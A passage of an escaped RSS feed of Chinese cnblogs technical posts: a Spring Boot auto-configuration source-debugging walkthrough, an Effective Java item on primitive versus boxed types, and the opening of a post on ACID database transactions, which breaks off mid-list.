+&lt;p&gt;常量FACTORIES_RESOURCE_LOCATION = &quot;META-INF/spring.factories&quot;。&lt;/p&gt;
+&lt;p&gt;下面的方法通过类加载器获取jar包中所有META-INF/spring.factories并获取其中的内容：&lt;/p&gt;
+&lt;p&gt;&lt;img src=&quot;https://img2018.cnblogs.com/blog/864087/201903/864087-20190323093839998-2097551674.png&quot; alt=&quot;&quot;/&gt;&lt;/p&gt;
+&lt;p&gt;最后的urls包含扫描到3个jar包中有spring.factories文件：&lt;/p&gt;
+&lt;p&gt;&lt;img src=&quot;https://img2018.cnblogs.com/blog/864087/201903/864087-20190323094336270-2124179820.png&quot; alt=&quot;&quot;/&gt;&lt;/p&gt;
+&lt;p&gt;&lt;strong&gt;接下来对urls进行3次遍历：&lt;/strong&gt;&lt;/p&gt;
+&lt;p&gt;第一次遍历的文件路径url=jar:file:/C:/Users/Alan/.m2/repository/org/springframework/boot/spring-boot/1.5.17.RELEASE&lt;strong&gt;/spring-boot-1.5.17.RELEASE.jar&lt;/strong&gt;!/META-INF/spring.factories&lt;/p&gt;
+&lt;p&gt;通过Properties properties = PropertiesLoaderUtils.loadProperties(new UrlResource(url));得到的properties对象的大小为7：&lt;/p&gt;
+&lt;p&gt;&lt;img src=&quot;https://img2018.cnblogs.com/blog/864087/201903/864087-20190323094538336-798979726.png&quot; alt=&quot;&quot;/&gt;&lt;/p&gt;
+&lt;p&gt;因为上述properties并不存在org.springframework.boot.autoconfigure.EnableAutoConfiguration的key，&lt;/p&gt;
+&lt;p&gt; 所以String factoryClassNames = properties.getProperty(factoryClassName);得到的factoryClassNames为null&lt;/p&gt;
+&lt;p&gt; &lt;img src=&quot;https://img2018.cnblogs.com/blog/864087/201903/864087-20190323094633763-1455114495.png&quot; alt=&quot;&quot;/&gt;&lt;/p&gt;
+&lt;p&gt;此时存放自动配置类的list集合result的大小仍然为0。&lt;/p&gt;
+&lt;p&gt;第二次遍历的文件路径url=jar:file:/C:/Users/Alan/.m2/repository/org/springframework/boot/spring-boot-autoconfigure/1.5.17.RELEASE&lt;strong&gt;/spring-boot-autoconfigure-1.5.17.RELEASE.jar&lt;/strong&gt;!/META-INF/spring.factories&lt;/p&gt;
+&lt;p&gt;该文件也有7个键值对，新生成的properties大小为7：&lt;/p&gt;
+&lt;p&gt;&lt;img src=&quot;https://img2018.cnblogs.com/blog/864087/201903/864087-20190323094914634-335587961.png&quot; alt=&quot;&quot;/&gt;&lt;/p&gt;
+&lt;p&gt;&lt;strong&gt;此时properties.getProperty(factoryClassName)将能找到key=org.springframework.boot.autoconfigure.EnableAutoConfiguration的属性键值对。&lt;/strong&gt;&lt;/p&gt;
+&lt;p&gt;&lt;strong&gt;factoryClassNames此时包含了org.springframework.boot.autoconfigure.EnableAutoConfiguration对应的value值，最后全部添加到list集合里面，共有96个值（Arrays.asList转换得到）：&lt;/strong&gt;&lt;/p&gt;
+&lt;p&gt;&lt;img src=&quot;https://img2018.cnblogs.com/blog/864087/201903/864087-20190323095012794-1589550906.png&quot; alt=&quot;&quot;/&gt;&lt;/p&gt;
+&lt;p&gt;第三次遍历jar:file:/C:/Users/Alan/.m2/repository/org/springframework/spring-beans/4.3.20.RELEASE/&lt;strong&gt;spring-beans-4.3.20.RELEASE.jar&lt;/strong&gt;!/META-INF/spring.factories&lt;/p&gt;
+&lt;p&gt;但是里面仍然没有org.springframework.boot.autoconfigure.EnableAutoConfiguration的key，所以result里面并没有添加新元素。&lt;/p&gt;
+&lt;p&gt;&lt;span&gt; 总共进行了3次遍历，分别是下面3个jar包包含spring.factories文件：&lt;/span&gt;&lt;/p&gt;
+&lt;p&gt;&lt;span&gt;1、spring-boot-1.5.17.RELEASE.jar&lt;/span&gt;&lt;/p&gt;
+&lt;p&gt;&lt;span&gt;2、spring-boot-autoconfigure-1.5.17.RELEASE.jar&lt;/span&gt;&lt;/p&gt;
+&lt;p&gt;&lt;span&gt;3、spring-beans-4.3.20.RELEASE.jar&lt;/span&gt;&lt;/p&gt;
+&lt;p&gt;&lt;span&gt;而上述3个jar的spring.factories只有spring-boot-autoconfigure-1.5.17.RELEASE.jar中包含org.springframework.boot.autoconfigure.EnableAutoConfiguration的key，这样就把需要自动配置的候选类都找出并放入list集合中。&lt;/span&gt;&lt;/p&gt;
+&lt;p&gt;接着还会用断言判断configurations是否有元素，否则提示：No auto configuration classes found in META-INF/spring.factories. If you  are using a custom packaging, make sure that file is correct.&lt;/p&gt;
+&lt;p&gt;&lt;img src=&quot;https://img2018.cnblogs.com/blog/864087/201903/864087-20190323095239716-1590700558.png&quot; alt=&quot;&quot;/&gt;&lt;/p&gt;
+&lt;p&gt;最后返回自动配置类的list集合对象configurations。&lt;/p&gt;
+&lt;p&gt;&lt;strong&gt;&lt;span&gt;第四处断点：&lt;/span&gt;&lt;/strong&gt;&lt;/p&gt;
+&lt;p&gt;&lt;img src=&quot;https://img2018.cnblogs.com/blog/864087/201903/864087-20190323095429872-1451440579.png&quot; alt=&quot;&quot;/&gt;&lt;/p&gt;
+&lt;p&gt; filter方法传入了2个参数：&lt;/p&gt;
+&lt;p&gt;1、configurations：读取MEAT-INF/spring.factories文件得到的经过排除得到的自动配置类名的list集合&lt;/p&gt;
+&lt;p&gt;&lt;img src=&quot;https://img2018.cnblogs.com/blog/864087/201903/864087-20190323095544889-481797446.png&quot; alt=&quot;&quot;/&gt;&lt;/p&gt;
+&lt;p&gt;2、autoConfigurationMetadata：读取META-INF/spring-autoconfigure-metadata.properties文件得到的485个键值对。&lt;/p&gt;
+&lt;p&gt;&lt;img src=&quot;https://img2018.cnblogs.com/blog/864087/201903/864087-20190323095600054-1617722672.png&quot; alt=&quot;&quot;/&gt;&lt;/p&gt;
+&lt;p&gt;候选自动配置类数组candidates 由configurations转数组而来：String[] candidates = configurations.toArray(new String[configurations.size()]);其值如下：&lt;/p&gt;
+&lt;p&gt;&lt;img src=&quot;https://img2018.cnblogs.com/blog/864087/201903/864087-20190323095713489-1270056946.png&quot; alt=&quot;&quot;/&gt;&lt;/p&gt;
+&lt;p&gt;for循环中的getAutoConfigurationImportFilters定义如下：&lt;/p&gt;
+&lt;p&gt;&lt;img src=&quot;https://img2018.cnblogs.com/blog/864087/201903/864087-20190323095856815-1106750986.png&quot; alt=&quot;&quot;/&gt;&lt;/p&gt;
+&lt;p&gt;里面的SpringFactoriesLoader.loadFactories()方法定义如下：&lt;/p&gt;
+&lt;p&gt;&lt;img src=&quot;https://img2018.cnblogs.com/blog/864087/201903/864087-20190323100006221-322001360.png&quot; alt=&quot;&quot;/&gt;&lt;/p&gt;
+&lt;p&gt;上述方法主要目的是找寻spring.factories文件中key=org.springframework.boot.autoconfigure.AutoConfigurationImportFilter对应的值，&lt;/p&gt;
+&lt;p&gt;&lt;span&gt;这里依然进行了3次遍历，分别是下面3个jar包包含spring.factories文件&lt;/span&gt;&lt;br/&gt;&lt;span&gt;1、spring-boot-1.5.17.RELEASE.jar&lt;/span&gt;&lt;br/&gt;&lt;span&gt;2、spring-boot-autoconfigure-1.5.17.RELEASE.jar&lt;/span&gt;&lt;br/&gt;&lt;span&gt;3、spring-beans-4.3.20.RELEASE.jar&lt;/span&gt;&lt;br/&gt;&lt;span&gt;而上述3个jar的spring.factories只有spring-boot-autoconfigure-1.5.17.RELEASE.jar中包含了org.springframework.boot.autoconfigure.AutoConfigurationImportFilter的key。&lt;/span&gt;&lt;/p&gt;
+&lt;p&gt; 通过loadFactoryNames(factoryClass, classLoaderToUse)得到的factoryNames为org.springframework.boot.autoconfigure.condition.OnClassCondition类。&lt;/p&gt;
+&lt;p&gt;&lt;img src=&quot;https://img2018.cnblogs.com/blog/864087/201903/864087-20190323100327009-1651374275.png&quot; alt=&quot;&quot;/&gt;&lt;/p&gt;
+&lt;p&gt;接着遍历factoryNames，调用instantiateFactory方法，利用反射生成condition.OnClassCondition的实例添加到result集合中：&lt;/p&gt;
+&lt;p&gt;&lt;img src=&quot;https://img2018.cnblogs.com/blog/864087/201903/864087-20190323100403483-187333435.png&quot; alt=&quot;&quot;/&gt;&lt;/p&gt;
+&lt;p&gt;最后对result进行排序并返回：AnnotationAwareOrderComparator.sort(result);&lt;/p&gt;
+&lt;p&gt;&lt;img src=&quot;https://img2018.cnblogs.com/blog/864087/201903/864087-20190323100729961-1582629677.png&quot; alt=&quot;&quot;/&gt;&lt;/p&gt;
+&lt;p&gt;getAutoConfigurationImportFilters()分析完了，我们继续看for循环：&lt;/p&gt;
+&lt;p&gt;&lt;img src=&quot;https://img2018.cnblogs.com/blog/864087/201903/864087-20190323100951724-1278213364.png&quot; alt=&quot;&quot;/&gt;&lt;/p&gt;
+&lt;p&gt;上面的invokeAwareMethods(filter)方法根据filter是否实现了相关接口，对其进行了设置：&lt;/p&gt;
+&lt;p&gt;&lt;img src=&quot;https://img2018.cnblogs.com/blog/864087/201903/864087-20190323101037298-118918524.png&quot; alt=&quot;&quot;/&gt;&lt;/p&gt;
+&lt;p&gt;filter满足instance instanceof Aware、instance instanceof BeanClassLoaderAware、instance instanceof BeanFactoryAware。&lt;/p&gt;
+&lt;p&gt;&lt;span&gt;&lt;strong&gt;接下来我们着重看下match方法：&lt;/strong&gt;&lt;/span&gt;&lt;/p&gt;
+&lt;p&gt;&lt;img src=&quot;https://img2018.cnblogs.com/blog/864087/201903/864087-20190323101306388-299787757.png&quot; alt=&quot;&quot;/&gt;&lt;/p&gt;
+&lt;p&gt;上述方法调用了OnClassCondition类的match方法：&lt;/p&gt;
+&lt;p&gt;&lt;img src=&quot;https://img2018.cnblogs.com/blog/864087/201903/864087-20190323101435101-630785586.png&quot; alt=&quot;&quot;/&gt;&lt;/p&gt;
+&lt;p&gt; 传入的参数是之前排除过自动配置类，目前还有96个：&lt;/p&gt;
+&lt;p&gt;&lt;img src=&quot;https://img2018.cnblogs.com/blog/864087/201903/864087-20190323101531342-2092244372.png&quot; alt=&quot;&quot;/&gt;&lt;/p&gt;
+&lt;p&gt;下面的方法利用autoConfigurationMetadata对象对autoConfigurationClasses进行处理，autoConfigurationMetadata是加载META-INF/spring-autoconfigure-metadata.properties得到的485个元素，autoConfigurationClasses是读取META-INF/spring.factories文件key为org.springframework.boot.autoconfigure.EnableAutoConfiguration得到值进行排除、排序、去重等操作得到的候选自动配置类（由于没有添加排除项，目前仍然有96个）。&lt;/p&gt;
+&lt;p&gt;&lt;img src=&quot;https://img2018.cnblogs.com/blog/864087/201903/864087-20190323101601817-423954615.png&quot; alt=&quot;&quot;/&gt;&lt;/p&gt;
+&lt;p&gt;getOutComes定义如下：&lt;/p&gt;
+&lt;p&gt;&lt;img src=&quot;https://img2018.cnblogs.com/blog/864087/201903/864087-20190323102126738-1531869804.png&quot; alt=&quot;&quot;/&gt;&lt;/p&gt;
+&lt;p&gt;该方法将自动候选配置类分成2半进行条件判断处理，outcomes存入的是条件判断后的结果：&lt;/p&gt;
+&lt;p&gt;&lt;img src=&quot;https://img2018.cnblogs.com/blog/864087/201903/864087-20190323102338073-698661681.png&quot; alt=&quot;&quot;/&gt;&lt;/p&gt;
+&lt;p&gt;匹配结束后的ConditionEvaluationReport对象report存放了不匹配的结果，从结果中看到候选的96个自动配置类，有72个不满足条件而被过滤：&lt;/p&gt;
+&lt;p&gt;&lt;img src=&quot;https://img2018.cnblogs.com/blog/864087/201903/864087-20190323102447803-768315245.png&quot; alt=&quot;&quot;/&gt;&lt;/p&gt;
+&lt;p&gt;随便点开一个outcomes元素：&lt;/p&gt;
+&lt;p&gt;&lt;strong&gt;org.springframework.boot.autoconfigure.aop.AopAutoConfiguration&lt;/strong&gt; -&amp;gt; key=org.springframework.boot.autoconfigure.aop.AopAutoConfiguration；&lt;/p&gt;
+&lt;p&gt;&lt;strong&gt;&lt;span&gt;匹配失败原因&lt;/span&gt;&lt;/strong&gt;：&lt;strong&gt;&lt;span&gt;@ConditionalOnClass did not find required classes 'org.aspectj.lang.annotation.Aspect', 'org.aspectj.lang.reflect.Advice'&lt;/span&gt;&lt;/strong&gt;&lt;/p&gt;
+&lt;p&gt;&lt;strong&gt;&lt;span&gt;由于项目没有引入aop的相关依赖，导致类路径中没有Aspect和Advice类，导致AopAutoConfiguration这个自动配置类匹配失败。&lt;/span&gt;&lt;/strong&gt;&lt;/p&gt;
+&lt;p&gt;&lt;strong&gt;(1) META-INF/spring-autoconfigure-metadata.properties文件中的Aop内容：&lt;/strong&gt;&lt;/p&gt;
+&lt;p&gt;&lt;span&gt;org.springframework.boot.autoconfigure.aop.AopAutoConfiguration.Configuration=&lt;/span&gt;&lt;/p&gt;
+&lt;p&gt;&lt;em&gt;&lt;span&gt;org.springframework.boot.autoconfigure.aop.AopAutoConfiguration=&lt;/span&gt;&lt;/em&gt;&lt;/p&gt;
+&lt;p&gt;&lt;em&gt;&lt;span&gt;org.springframework.boot.autoconfigure.aop.AopAutoConfiguration.ConditionalOnClass=&lt;/span&gt;&lt;/em&gt;&lt;/p&gt;
+&lt;p&gt;&lt;em&gt;&lt;span&gt;org.springframework.context.annotation.EnableAspectJAutoProxy,org.aspectj.lang.annotation.Aspect,org.aspectj.lang.reflect.Advice&lt;/span&gt;&lt;/em&gt;&lt;/p&gt;
+&lt;p&gt;&lt;strong&gt;(2) META-INF/spring.factories中的Aop内容：&lt;/strong&gt;&lt;/p&gt;
+&lt;p&gt;&lt;span&gt;org.springframework.boot.autoconfigure.EnableAutoConfiguration=\&lt;/span&gt;&lt;br/&gt;&lt;em&gt;&lt;span&gt;org.springframework.boot.autoconfigure.aop.AopAutoConfiguration,\&lt;/span&gt;&lt;/em&gt;&lt;/p&gt;
+&lt;p&gt;&lt;span&gt;&lt;strong&gt;因此spring.factories中的key=org.springframework.boot.autoconfigure.EnableAutoConfiguration对应的值只是候选的自动配置类；&lt;/strong&gt;&lt;/span&gt;&lt;br/&gt;&lt;span&gt;&lt;strong&gt;能否成功配置，关键还要看是否已经被排除以及是否满足spring-autoconfigure-metadata.properties中对对应配置类的加载条件。&lt;/strong&gt;&lt;/span&gt;&lt;br/&gt;&lt;span&gt;&lt;strong&gt;若不满足，则该类是会从自动配置类列表中排除，这样能加快springboot的启动速度。&lt;/strong&gt;&lt;/span&gt;spring官方文档（&lt;a href=&quot;https://docs.spring.io/spring-boot/docs/current/reference/html/boot-features-developing-auto-configuration.html&quot; target=&quot;_blank&quot;&gt;&lt;em&gt;&lt;span&gt;https://docs.spring.io/spring-boot/docs/current/reference/html/boot-features-developing-auto-configuration.html&lt;/span&gt;&lt;/em&gt;&lt;/a&gt;）对该文件的作用描述如下：&lt;/p&gt;
+&lt;p&gt;&lt;em&gt;&lt;strong&gt;&lt;span&gt;Spring Boot uses an annotation processor to collect the conditions on auto-configurations in a metadata file (&lt;code class=&quot;literal&quot;&gt;META-INF/spring-autoconfigure-metadata.properties&lt;/code&gt;). If that file is present, it is used to eagerly filter auto-configurations that do not match, which will improve startup time. &lt;/span&gt;&lt;/strong&gt;&lt;/em&gt;&lt;/p&gt;
+&lt;p&gt;然后根据匹配结果，将真正满足配置条件的配置类放入list集合中  boolean[] skip记录了对应的候选自动配置类是否需要跳过，true-不满足条件，需要跳过，false-满足条件，不需要跳过。&lt;/p&gt;
+&lt;p&gt;&lt;img src=&quot;https://img2018.cnblogs.com/blog/864087/201903/864087-20190323103425520-1375604426.png&quot; alt=&quot;&quot;/&gt;&lt;/p&gt;
+&lt;p&gt;for循环结束，只有24个自动配置真正符合条件：&lt;/p&gt;
+&lt;p&gt;&lt;img src=&quot;https://img2018.cnblogs.com/blog/864087/201903/864087-20190323103444734-1468990290.png&quot; alt=&quot;&quot;/&gt;&lt;/p&gt;
+&lt;p&gt;&lt;img src=&quot;https://img2018.cnblogs.com/blog/864087/201903/864087-20190323103511361-944734659.png&quot; alt=&quot;&quot;/&gt;&lt;/p&gt;
+&lt;p&gt;因此第四处断点走完，真正符合自动配置条件类的自动配置类只有24个了（根据项目配置情况会有所不同）：&lt;/p&gt;
+&lt;p&gt;&lt;img src=&quot;https://img2018.cnblogs.com/blog/864087/201903/864087-20190323103612328-1500420730.png&quot; alt=&quot;&quot;/&gt;&lt;/p&gt;
+&lt;p&gt;&lt;span&gt;&lt;strong&gt;至此，SpringBoot自动配置源码调试告一段落，总结如下：&lt;/strong&gt;&lt;/span&gt;&lt;/p&gt;
+&lt;p&gt;&lt;strong&gt;&lt;span&gt;1、读取META-INF/spring-autoconfigure-metadata.properties文件中的内容；&lt;/span&gt;&lt;/strong&gt;&lt;/p&gt;
+&lt;p&gt;&lt;strong&gt;&lt;span&gt;2、获取需要排除的自动配置类；&lt;/span&gt;&lt;/strong&gt;&lt;/p&gt;
+&lt;p&gt;&lt;strong&gt;&lt;span&gt;3、读取spring-boot-autoconfigure-1.5.17.RELEASE.jar中的META-INF/spring.factories文件内容，作为候选自动配置类；&lt;/span&gt;&lt;/strong&gt;&lt;/p&gt;
+&lt;p&gt;&lt;strong&gt;&lt;span&gt;4、对候选自动配置类进行去重、排序、去除所有排除项；&lt;/span&gt;&lt;/strong&gt;&lt;/p&gt;
+&lt;p&gt;&lt;strong&gt;&lt;span&gt;5、利用META-INF/spring-autoconfigure-metadata.properties文件的配置对META-INF/spring.factories经历第四步处理后的候选自动配置类进行过滤，去除不满足加载条件的类，得到最终的自动配置类供SpringBoot加载。&lt;/span&gt;&lt;/strong&gt;&lt;/p&gt;
+&lt;p&gt;&lt;img src=&quot;https://img2018.cnblogs.com/blog/864087/201903/864087-20190323105423627-1792337176.png&quot; alt=&quot;&quot;/&gt;&lt;/p&gt;
+
+</description>
+<pubDate>Sat, 23 Mar 2019 03:14:00 +0000</pubDate>
+<dc:creator>STM32STM32STM32</dc:creator>
+<og:description>之前对SpringBoot的自动配置原理进行了较为详细的介绍（https://www.cnblogs.com/stm32stm32/p/10560933.html），接下来就对自动配置进行源码调试，探</og:description>
+<dc:language>zh-cn</dc:language>
+<dc:format>text/html</dc:format>
+<dc:identifier>http://www.cnblogs.com/stm32stm32/p/10575145.html</dc:identifier>
+</item>
+<item>
+<title>Effective Java 第三版——61. 基本类型优于装箱的基本类型 - 林本托</title>
+<link>http://www.cnblogs.com/IcanFixIt/p/10582913.html</link>
+<guid isPermaLink="true" >http://www.cnblogs.com/IcanFixIt/p/10582913.html</guid>
+<description>&lt;blockquote readability=&quot;5.0845771144279&quot;&gt;
+&lt;p&gt;Tips&lt;br/&gt;书中的源代码地址：&lt;a href=&quot;https://github.com/jbloch/effective-java-3e-source-code&quot; class=&quot;uri&quot;&gt;https://github.com/jbloch/effective-java-3e-source-code&lt;/a&gt;&lt;br/&gt;注意，书中的有些代码里方法是基于Java 9 API中的，所以JDK 最好下载 JDK 9以上的版本。&lt;/p&gt;
+&lt;/blockquote&gt;
+&lt;p&gt;&lt;img src=&quot;https://upload-images.jianshu.io/upload_images/4366140-8966e457a14bc8b9.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240&quot; alt=&quot;Effective Java, Third Edition&quot;/&gt;&lt;/p&gt;
+
+&lt;p&gt;Java是一个由两部分类型组成的系统，一部分由基本类型组成，如int，double和boolean，还有一部分是引用类型，如String和List。 每个基本类型都有一个相应的引用类型，称为装箱基本类型。 对应于int，double和boolean的盒装基元是Integer，Double和Boolean。&lt;/p&gt;
+&lt;p&gt;正如条目6中提到的，自动装箱和自动拆箱模糊了基本类型和装箱基本类型之间的区别，但不会消除它们。这两者之间有真正的区别，重要的是要始终意识到你正在使用的是哪一种，并在它们之间仔细选择。&lt;/p&gt;
+&lt;p&gt;基本类型和包装基本类型之间有三个主要区别。首先，基本类型只有它们的值，而包装基本类型具有与其值不同的标识。换句话说，两个包装基本类型实例可以具有相同的值但不同的引用标识。第二，基本类型只有功能的值（functional value），而每个包装基本类型类型除了对应的基本类型的功能值外，还有一个非功能值，即null。最后，基本类型比包装的基本类型更节省时间和空间。如果你不小心的话，这三种差异都会给你带来真正的麻烦。&lt;/p&gt;
+&lt;p&gt;考虑下面的比较器，它的设计目的是表示Integer值的升序数字顺序。(回想一下，比较器的compare方法返回一个负数、零或正数，这取决于它的第一个参数是小于、等于还是大于第二个参数)。你不需要在实践中编写这个比较器，因为它实现了Integer的自然排序，但它提供了一个有趣的例子:&lt;/p&gt;
+&lt;pre&gt;
+&lt;code&gt;// Broken comparator - can you spot the flaw?
+Comparator&amp;lt;Integer&amp;gt; naturalOrder =
+    (i, j) -&amp;gt; (i &amp;lt; j) ? -1 : (i == j ? 0 : 1);&lt;/code&gt;
+&lt;/pre&gt;
+&lt;p&gt;这个比较器看起来应该工作，也能通过很多测试。 例如，它可以与&lt;code&gt;Collections.sort&lt;/code&gt;方法一起使用，以正确排序百万个元素列表，无论列表是否包含重复元素。 但这个比较器存在严重缺陷。 为了说服自己，只需打印&lt;code&gt;naturalOrder.compare(new Integer(42)，new Integer(42))&lt;/code&gt;的值。 两个Integer实例都表示相同的值（42），因此该表达式的值应为0，但它为1，表示第一个Integer值大于第二个值！&lt;/p&gt;
+&lt;p&gt;那么问题出在哪里呢？&lt;code&gt;naturalOrder&lt;/code&gt;中的第一个测试工作得很好。计算表达式&lt;code&gt;i &amp;lt; j&lt;/code&gt;会使i和j引用的整数实例自动拆箱；也就是说，它提取它们的基本类型值。计算的目的是检查得到的第一个int值是否小于第二个int值。但假设是否定的。然后，下一个测试计算表达式&lt;code&gt;i==j&lt;/code&gt;，该表达式对两个对象执行引用标识比较。如果i和j引用表示相同整型值的不同Integer实例，这个比较将返回false，比较器将错误地返回1，表明第一个整型值大于第二个整型值。&lt;strong&gt;将==操作符应用于装箱的基本类型几乎总是错误的&lt;/strong&gt;。&lt;/p&gt;
+&lt;p&gt;在实践中，如果你需要一个比较器来描述类型的自然顺序，应该简单地调用&lt;code&gt;comparator . naturalorder()&lt;/code&gt;方法，如果自己编写一个比较器，应该使用比较器构造方法，或者对基本类型使用静态compare方法(条目 14)。也就是说，可以通过添加两个局部变量来存储与装箱Integer参数对应的原始int值，并对这些变量执行所有的比较，从而修复了损坏的比较器中的问题。这样避免了错误的引用一致性比较:&lt;/p&gt;
+&lt;pre&gt;
+&lt;code&gt;Comparator&amp;lt;Integer&amp;gt; naturalOrder = (iBoxed, jBoxed) -&amp;gt; {
+    int i = iBoxed, j = jBoxed; // Auto-unboxing
+    return i &amp;lt; j ? -1 : (i == j ? 0 : 1);
+};&lt;/code&gt;
+&lt;/pre&gt;
+&lt;p&gt;接下来，考虑一下这个有趣的小程序:&lt;/p&gt;
+&lt;pre&gt;
+&lt;code&gt;public class Unbelievable {
+    static Integer i;
+
+    public static void main(String[] args) {
+        if (i == 42)
+            System.out.println(&quot;Unbelievable&quot;);
+    }
+}&lt;/code&gt;
+&lt;/pre&gt;
+&lt;p&gt;它不会打印出&lt;code&gt;Unbelievable&lt;/code&gt;字符串——但它所做的事情几乎同样奇怪。它在计算表达式&lt;code&gt;i==42时&lt;/code&gt;抛出&lt;code&gt;NullPointerException&lt;/code&gt;。问题是，i是Integer类型，而不是int类型，而且像所有非常量对象引用属性一样，它的初始值为null。当程序计算表达式&lt;code&gt;i==42&lt;/code&gt;时，它是在比较Integer和int之间的关系。 &lt;strong&gt;几乎在每种情况下，当在基本类型和包装基本类型进行混合操作时，包装基本类型会自动拆箱&lt;/strong&gt;。如果对一个null对象进行自动拆箱，那么会抛出NullPointerException。正如这个程序所演示的，它几乎可以在任何地方发生。修复这个问题非常简单，只需将i声明为int而不是Integer就可以了。&lt;/p&gt;
+&lt;p&gt;最后，考虑第24页条目6中的程序:&lt;/p&gt;
+&lt;pre&gt;
+&lt;code&gt;// Hideously slow program! Can you spot the object creation?
+public static void main(String[] args) {
+    Long sum = 0L;
+    for (long i = 0; i &amp;lt; Integer.MAX_VALUE; i++) {
+        sum += i;
+    }
+    System.out.println(sum);
+}&lt;/code&gt;
+&lt;/pre&gt;
+&lt;p&gt;那么，什么时候应该使用装箱原语呢?它们有几个合法的用途。第一个是作为集合中的元素、键和值。不能将原语放在集合中，因此必须使用装箱的原语。这是一般情况下的特例。在参数化类型和方法(第5章)中，必须使用装箱原语作为类型参数，因为该语言不允许使用原语。例如，不能将变量声明为ThreadLocal类型，因此必须使用ThreadLocal。最后，在进行反射方法调用时，必须使用装箱原语(第65项)。&lt;/p&gt;
+&lt;p&gt;这个程序比它原本的速度慢得多，因为它意外地声明了一个局部变量(sum)，它是装箱的基本类型Long，而不是基本类型long。程序在没有错误或警告的情况下编译，变量被反复装箱和拆箱，导致观察到的性能下降。&lt;/p&gt;
+&lt;p&gt;在本条目中讨论的所有三个程序中，问题都是一样的:程序员忽略了基本类型和包装基本类型之间的区别，并承担了后果。在前两个项目中，结果是彻底的失败;第三，严重的性能问题。&lt;/p&gt;
+&lt;p&gt;那么，什么时候应该使用装箱基本类型呢？它们有几个合法的用途。第一个是作为集合中的元素、键和值。不能将基本类型放在集合中，因此必须使用装箱的基本类型。这是一般情况下的特例。在参数化类型和方法(第5章)中，必须使用装箱基本类型作为类型参数，因为该语言不允许使用基本类型。例如，不能将变量声明为&lt;code&gt;ThreadLocal&amp;lt;int&amp;gt;&lt;/code&gt;类型，因此必须使用&lt;code&gt;ThreadLocal&amp;lt;Integer&amp;gt;&lt;/code&gt;。最后，在进行反射方法调用时，必须使用装箱基本类型(条目 65)。&lt;/p&gt;
+&lt;p&gt;总之，只要有选择，就应该优先使用基本类型，而不是装箱基本类型。基本类型更简单、更快。如果必须使用装箱基本类型，则需要小心！&lt;strong&gt;自动装箱减少了使用装箱基本类型的冗长，但没有降低使用的危险&lt;/strong&gt;。当程序使用==操作符比较两个装箱的基本类型时，它会执行引用标识比较，这几乎肯定不是你想要的。当程序执行包含装箱和拆箱基本类型的混合类型计算时，它会执行拆箱，&lt;strong&gt;当程序执行拆箱时，会抛出NullPointerException&lt;/strong&gt;。最后，当程序装箱了基本类型，可能会导致代价高昂且创建了不必要的对象。&lt;/p&gt;
+</description>
+<pubDate>Sat, 23 Mar 2019 02:54:00 +0000</pubDate>
+<dc:creator>林本托</dc:creator>
+<og:description>Tips 书中的源代码地址：https://github.com/jbloch/effective java 3e source code 注意，书中的有些代码里方法是基于Java 9 API中的，所</og:description>
+<dc:language>zh-cn</dc:language>
+<dc:format>text/html</dc:format>
+<dc:identifier>http://www.cnblogs.com/IcanFixIt/p/10582913.html</dc:identifier>
+</item>
+<item>
+<title>分布式事务？咱先弄明白本地事务再说 - ACID - 土豆的奥特之父</title>
+<link>http://www.cnblogs.com/xguo/p/10582648.html</link>
+<guid isPermaLink="true" >http://www.cnblogs.com/xguo/p/10582648.html</guid>
+<description>&lt;div class=&quot;image-package&quot;&gt;
+&lt;div class=&quot;image-container&quot;&gt;
+&lt;div class=&quot;image-view&quot; data-width=&quot;1433&quot; data-height=&quot;793&quot;&gt;&lt;br class=&quot;Apple-interchange-newline&quot;/&gt;&lt;img src=&quot;https://img2018.cnblogs.com/blog/57355/201903/57355-20190323094905327-79687081.png&quot; alt=&quot;&quot;/&gt;
+&lt;/div&gt;
+&lt;/div&gt;
+
+&lt;/div&gt;
+&lt;p&gt;过去一段时间面试的同学，对于数据库事务，可以按照配置正常使用，但很多都无法讲清楚和理解数据库事务这个东西真正的意义，以及互联网兴起以后，当今数据库在ACID面前面临怎样的问题和抉择。&lt;/p&gt;
+&lt;p&gt;事务，是各大单机SQL数据库厂商包括Oracle、IBM DB2等，早在上世纪80年代提出的一个解决 数据并发操作处理的模型 ，旨在满足多用户（多线程、进程）对数据操作的场景下，依然能保证逻辑正确执行，状体持久，且各大厂商提出，并在事务实现上都遵循事务的 ACID 4个特性。&lt;/p&gt;
+&lt;h2&gt;回顾ACID&lt;/h2&gt;
+&lt;div class=&quot;image-package&quot;&gt;
+&lt;div class=&quot;image-container&quot;&gt;
+
+&lt;div class=&quot;image-view&quot; data-width=&quot;1720&quot; data-height=&quot;895&quot;&gt;&lt;img src=&quot;https://img2018.cnblogs.com/blog/57355/201903/57355-20190323094914736-1459866119.png&quot; alt=&quot;&quot;/&gt;
+&lt;/div&gt;
+&lt;/div&gt;
+
+&lt;/div&gt;
+&lt;p&gt;一个模块，是多个独立的功能逻辑的组合，每个功能包含多个操作步骤，包括IO、计算、数据库等操作，必须保证每一步都被执行，且执行正确，这个功能和模块才是可用，可交付的。&lt;/p&gt;
+
+&lt;div class=&quot;image-package&quot;&gt;
+&lt;div class=&quot;image-container&quot;&gt;
+
+&lt;div class=&quot;image-view&quot; data-width=&quot;494&quot; data-height=&quot;213&quot;&gt;&lt;img src=&quot;https://img2018.cnblogs.com/blog/57355/201903/57355-20190323094924183-1338282146.png&quot; alt=&quot;&quot;/&gt;
+&lt;/div&gt;
+&lt;/div&gt;
+&lt;/div&gt;
+&lt;p&gt;那么，如何保证这些操作的完整性，就是Atomic，定义为一个原子操作，全部执行且成功，或者全部失败都不执行（回滚），原子操作如果成功，那状态就必须持久，被称为数据库的Durability，持久性。&lt;/p&gt;
+&lt;p&gt;原子性A、持久性D，这俩个都比较好理解，定义了事务的边界，行为的开始和行为的结束。&lt;/p&gt;
+&lt;p&gt;A、D定义了事务的边界，那一致性C、隔离性I，就是对事务中间状态的管理，&lt;/p&gt;
+
+&lt;p&gt;一致性，也可以理解为是数据的完整性，数据的有效性，我们举例来说明什么是一致性，以及事务是如何保证一致性的，&lt;/p&gt;
+&lt;ul&gt;&lt;li&gt;一个账户减100，另一个账户加100的时候，程序异常crash了，这时候就出现数据的不一致情况，破坏了有效性，这个问题可以由Atomic来保证；&lt;/li&gt;
+&lt;li&gt;一个原子操作在执行的过程中，涉及多个数据变更的中间状态的保护，例如把A账户减100，在加到B账户完成这个原子操作之前，此时，其他线程对A读的操作就有可能获取到A少100的这个中间状态，这种情况是否允许发生，由Isolation来保证；&lt;/li&gt;
